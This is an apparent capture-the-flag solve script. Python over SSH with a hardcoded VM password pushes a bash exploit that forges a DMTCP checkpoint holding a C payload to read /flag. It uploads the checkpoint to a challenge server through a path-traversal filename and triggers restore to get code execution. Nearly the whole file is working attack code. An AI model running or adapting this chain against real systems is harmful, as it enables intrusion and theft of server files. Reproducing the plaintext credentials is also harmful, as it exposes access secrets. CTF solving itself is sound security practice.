"""Copy exploit to VM, build the DMTCP image + forged checkpoint on a real Linux
kernel, then upload it to the challenge via path traversal and trigger restore."""
import sys
import paramiko

VM_HOST = '192.168.137.128'
VM_USER = 'kali'
VM_PASS = 'Mayank_1601'

TARGET = sys.argv[1] if len(sys.argv) > 1 else \
    'https://8000-76df56ad42634ea9acf04c4e6016b534.sbx.secso.cc'

SCRIPT = r'''#!/usr/bin/env bash
set -euo pipefail
URL="$1"
WORK="$HOME/pwn_primecalc"
mkdir -p "$WORK"; cd "$WORK"

cat > payload.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
int main(void){
  for(;;){
    FILE*f=fopen("/flag","r");
    if(f){char b[1024];size_t n=fread(b,1,sizeof b-1,f);fclose(f);
      if(n){FILE*o=fopen("/app/data/output/latest.txt","w");
        if(o){fwrite("PWNED ",1,6,o);fwrite(b,1,n,o);fclose(o);}
        FILE*p=fopen("/app/data/output/status.txt","w");
        if(p){fwrite(b,1,n,p);fclose(p);}
      }
    }
    usleep(100000);
  }
}
EOF

cat > Dockerfile <<'EOF'
FROM python:3.13-slim AS b
RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates curl gcc g++ make libc6-dev && rm -rf /var/lib/apt/lists/*
RUN curl -fsSL https://github.com/dmtcp/dmtcp/archive/refs/tags/v4.2.0.tar.gz -o /tmp/d.tgz \
 && mkdir /tmp/d && tar -xzf /tmp/d.tgz -C /tmp/d --strip-components=1 \
 && cd /tmp/d && ./configure --prefix=/opt/dmtcp && make -j"$(nproc)" && make install
FROM python:3.13-slim
RUN apt-get update && apt-get install -y --no-install-recommends gzip libatomic1 libstdc++6 gcc libc6-dev && rm -rf /var/lib/apt/lists/*
COPY --from=b /opt/dmtcp /opt/dmtcp
ENV PATH=/opt/dmtcp/bin:$PATH
COPY payload.c /payload.c
RUN gcc -O0 -o /payload /payload.c
CMD ["sh","-c","mkdir -p /out; rm -f /out/*.dmtcp; dmtcp_launch --new-coordinator --coord-port 7779 --ckptdir /out --interval 0 /payload & sleep 3; dmtcp_command --coord-port 7779 --bcheckpoint; sleep 1; dmtcp_command --coord-port 7779 --quit 2>/dev/null||true; ls /out"]
EOF

echo "[*] building image..."
docker build -t pcbuild . 2>&1 | tail -3
echo "[*] forging checkpoint on kernel $(uname -r)..."
mkdir -p out
docker run --rm -v "$PWD/out:/out" pcbuild >/dev/null 2>&1
CKPT="$(ls out/ckpt_payload_*.dmtcp 2>/dev/null | head -n1)"
if [ -z "$CKPT" ]; then echo "[-] no checkpoint file produced"; ls out; exit 1; fi
echo "[*] checkpoint: $CKPT ($(stat -c%s "$CKPT") bytes)"

echo "[*] uploading via path traversal..."
UP=$(curl -sk -X POST "$URL/api/config" -F 'timestamp=1/../../checkpoint.dmtcp' -F "config=@$CKPT;filename=x.dmtcp;type=application/octet-stream")
echo "  upload response: $UP"

echo "[*] triggering /api/run..."
RUN=$(curl -sk -X POST "$URL/api/run" --max-time 60)
echo "  run response (first 400 chars): ${RUN:0:400}"

sleep 2
echo "[*] reading /api/status..."
curl -sk "$URL/api/status"; echo
'''


def main():
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(VM_HOST, port=22, username=VM_USER, password=VM_PASS,
                look_for_keys=False, allow_agent=False, timeout=15)
    print('[*] SSH connected to VM')

    sftp = cli.open_sftp()
    with sftp.file('/home/kali/pwn.sh', 'w') as f:
        f.write(SCRIPT)
    sftp.chmod('/home/kali/pwn.sh', 0o755)
    sftp.close()

    print(f'[*] running exploit against {TARGET}')
    cli.exec_command(f'nohup bash /home/kali/pwn.sh {TARGET!r} > /home/kali/pwn.log 2>&1; echo DONE > /home/kali/pwn.done',
                     timeout=15)
    # poll for completion
    import time
    deadline = time.time() + 1200
    while time.time() < deadline:
        _, o, _ = cli.exec_command('test -f /home/kali/pwn.done && echo yes')
        if o.read().strip() == b'yes':
            break
        time.sleep(3)
    _, o, _ = cli.exec_command('cat /home/kali/pwn.log', timeout=60)
    blob = o.read().decode('utf-8', 'replace')
    print(blob)
    import re
    m = re.search(r'K17\{[^}]+\}', blob)
    if m:
        print('\n\n[+] FLAG:', m.group(0))
    cli.close()


if __name__ == '__main__':
    main()
